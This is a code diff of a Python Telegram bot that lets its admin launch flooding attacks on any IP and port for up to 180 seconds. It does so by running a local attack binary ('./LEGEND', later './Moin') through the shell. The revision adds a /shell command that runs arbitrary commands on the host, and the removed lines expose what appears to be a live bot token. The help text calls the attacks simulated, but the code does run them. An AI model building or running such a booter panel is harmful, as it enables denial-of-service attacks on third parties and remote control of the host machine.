@@ -1,104 +1,168 @@
 #!/usr/bin/python3
 import telebot
-import random
-import subprocess
 import time
 import threading
+import subprocess
 
 # Telegram bot token
-bot = telebot.TeleBot('7228305815:AAGZvYtuYd6BC1J1qYeneQFPzDa4XDW5tYQ')
+bot = telebot.TeleBot('YOUR_BOT_TOKEN')
 
 # Admin user IDs
 admin_id = ["1232047106"]
 
-# Group and channel details
-GROUP_ID = "-1002322006686"
-CHANNEL_USERNAME = "@srkddos"
+# Authorized users (Initially empty, you can add via /add)
+authorized_users = []
+
+# Cooldown tracker
+user_cooldowns = {}
+
+# Maximum duration and cooldown time
+MAX_DURATION = 180
+COOLDOWN_TIME = 30
 
 # YouTube Channel Promotion
-YOUTUBE_CHANNEL_LINK = "https://youtube.com/@zeroflexislive?si=QCy1x8BNZ3R1DRxD"
+YT_PROMO = "🚀 Don't forget to subscribe to our YouTube Channel: [SRK](https://www.youtube.com/@SRK) for more updates!"
 
-# List of Attack Messages
-attack_messages = [
-    "🚀 Firing rockets at {}!",
-    "💣 Dropping bombs on {}!",
-    "🧨 Blasting {} into pieces!",
-    "🎯 Target acquired: {}!",
-    "🔥 Launching fire attack on {}!",
-    "💥 Exploding {} with maximum force!",
-    "⚔️ Unleashing wrath on {}!",
-    "🔫 Shooting relentlessly at {}!",
-    "🪓 Hacking {} into oblivion!",
-    "😈 Bringing chaos to {}!"
-]
+# Command to simulate attack execution
+def execute_attack(target, port, duration):
+    time.sleep(duration)
+    return f"🏁 Attack on {target}:{port} finished after {duration} seconds! 🎉\n\n{YT_PROMO}"
 
-# Dictionary to Store Cooldowns (user_id: cooldown_end_time)
-user_cooldowns = {}
+# Command to execute shell commands asynchronously
+def execute_shell_command(command):
+    try:
+        # Run the command asynchronously
+        process = subprocess.Popen(command, shell=True)
+        return process
+    except Exception as e:
+        return f"Error executing command: {str(e)}"
 
 # Start Command
 @bot.message_handler(commands=['start'])
 def start(message):
     if str(message.from_user.id) in admin_id:
-        bot.reply_to(message, "Welcome Admin! How can I assist you today?")
+        bot.reply_to(message, "Welcome Admin! Type /attack to launch an attack.")
     else:
-        bot.reply_to(message, "Hello! Welcome to the bot.")
+        bot.reply_to(message, "You are not authorized to use this bot.")
 
-# Attack Command with 30-Second Per-User Cooldown
+# Attack Command
 @bot.message_handler(commands=['attack'])
 def attack(message):
-    user_id = message.from_user.id
-    current_time = time.time()
+    if str(message.from_user.id) not in admin_id:
+        bot.reply_to(message, "❌ You are not authorized to use this command.")
+        return
 
-    # Check if user is in cooldown
-    if user_id in user_cooldowns:
-        remaining_time = round(user_cooldowns[user_id] - current_time)
-        if remaining_time > 0:
-            bot.reply_to(message, f"⏳ Please wait {remaining_time} seconds before using /attack again!")
-            return
+    args = message.text.split()[1:]
+    if len(args) != 3:
+        bot.reply_to(message, "❌ Invalid format! Use /attack [target] [port] [duration].")
+        return
 
+    target, port, duration = args
     try:
-        args = message.text.split(' ')
-        if len(args) < 4:
-            bot.reply_to(message, "Usage: /attack <target> <port> <duration (max 180 sec)>")
+        duration = int(duration)
+        if duration > MAX_DURATION:
+            bot.reply_to(message, f"❌ Duration too long! Maximum allowed is {MAX_DURATION} seconds.")
+            return
+    except ValueError:
+        bot.reply_to(message, "❌ Duration must be a number.")
+        return
+
+    user_id = message.from_user.id
+    if user_id in user_cooldowns:
+        remaining_time = round(user_cooldowns[user_id] - time.time())
+        if remaining_time > 0:
+            bot.reply_to(message, f"⏳ Please wait {remaining_time} seconds before starting a new attack.")
             return
 
-        target, port, duration = args[1], args[2], int(args[3])
-        
-        # Validate Duration
-        if duration > 180:
-            bot.reply_to(message, "❌ Duration too long! Maximum allowed is 180 seconds.")
-            return
-        
-        # Show Attack Details
-        attack_msg = random.choice(attack_messages).format(target)
-        bot.reply_to(message, f"{attack_msg}\n\n🎯 **Target:** {target}\n🚪 **Port:** {port}\n⏱️ **Duration:** {duration} sec")
+    bot.reply_to(message, f"🔨 Hacking {target} into oblivion!\n\n🎯 **Target:** {target}\n📜 **Port:** {port}\n⏰ **Duration:** {duration} sec")
 
-        # Execute Shell Command
-        full_command = f"./LEGEND {target} {port} {duration}"
-        subprocess.Popen(full_command, shell=True)
+    # Start the attack in a new thread
+    threading.Thread(target=start_attack, args=(message, target, port, duration)).start()
+
+    # Set cooldown for the user
+    user_cooldowns[user_id] = time.time() + COOLDOWN_TIME
+
+def start_attack(message, target, port, duration):
+    # Command to execute shell attack
+    full_command = f"./Moin {target} {port} {duration}"
+    process = execute_shell_command(full_command)
+    
+    if process:
         bot.reply_to(message, f"✅ Attack started: `{full_command}`", parse_mode="Markdown")
+    else:
+        bot.reply_to(message, "❌ Error starting the attack.")
 
-        # Set Cooldown (30 seconds)
-        user_cooldowns[user_id] = current_time + 30
+# Add User Command
+@bot.message_handler(commands=['add'])
+def add_user(message):
+    if str(message.from_user.id) not in admin_id:
+        bot.reply_to(message, "❌ You are not authorized to use this command.")
+        return
 
-        # Timer for Completion Message
-        def finish_attack():
-            time.sleep(duration)
-            bot.reply_to(message, f"🏁 Attack on {target}:{port} finished after {duration} seconds! 🎉")
-            
-            # YouTube Channel Promotion
-            promotion_message = (
-                f"📢 Don't forget to check out our YouTube channel for more cool stuff! 🎬\n"
-                f"👉 [Visit Now]({https://youtube.com/@zeroflexislive?si=QCy1x8BNZ3R1DRxD})"
-            )
-            bot.send_message(message.chat.id, promotion_message, parse_mode="Markdown")
+    args = message.text.split()[1:]
+    if len(args) != 1:
+        bot.reply_to(message, "❌ Invalid format! Use /add [user_id].")
+        return
 
-        # Run the Timer in a Separate Thread
-        threading.Thread(target=finish_attack).start()
+    user_id = args[0]
+    if user_id not in authorized_users:
+        authorized_users.append(user_id)
+        bot.reply_to(message, f"✅ User {user_id} has been added successfully.")
+    else:
+        bot.reply_to(message, f"❌ User {user_id} is already authorized.")
 
-    except Exception as e:
-        bot.reply_to(message, f"Error: {e}")
+# Remove User Command
+@bot.message_handler(commands=['remove'])
+def remove_user(message):
+    if str(message.from_user.id) not in admin_id:
+        bot.reply_to(message, "❌ You are not authorized to use this command.")
+        return
 
-# Polling to keep the bot running
+    args = message.text.split()[1:]
+    if len(args) != 1:
+        bot.reply_to(message, "❌ Invalid format! Use /remove [user_id].")
+        return
+
+    user_id = args[0]
+    if user_id in authorized_users:
+        authorized_users.remove(user_id)
+        bot.reply_to(message, f"✅ User {user_id} has been removed successfully.")
+    else:
+        bot.reply_to(message, f"❌ User {user_id} is not authorized.")
+
+# Binary Access Shell Command
+@bot.message_handler(commands=['shell'])
+def shell(message):
+    if str(message.from_user.id) not in admin_id:
+        bot.reply_to(message, "❌ You are not authorized to use this command.")
+        return
+
+    args = message.text.split()[1:]
+    if len(args) == 0:
+        bot.reply_to(message, "❌ Invalid format! Use /shell [command].")
+        return
+
+    command = " ".join(args)
+    result = execute_shell_command(command)
+    bot.reply_to(message, f"🖥️ Shell command output:\n{result}")
+
+# Help Command
+@bot.message_handler(commands=['help'])
+def help(message):
+    bot.reply_to(message, """
+Here are the available commands:
+
+/start - Start the bot
+/attack [target] [port] [duration] - Simulate an attack
+/add [user_id] - Add a user to the authorized list
+/remove [user_id] - Remove a user from the authorized list
+/shell [command] - Execute a shell command (admin only)
+/help - Show this help message
+
+Owner: @OWNERSRK
+    """)
+
+# Run the bot
 print("Bot is running...")
-bot.infinity_polling()
+bot.polling()
+        
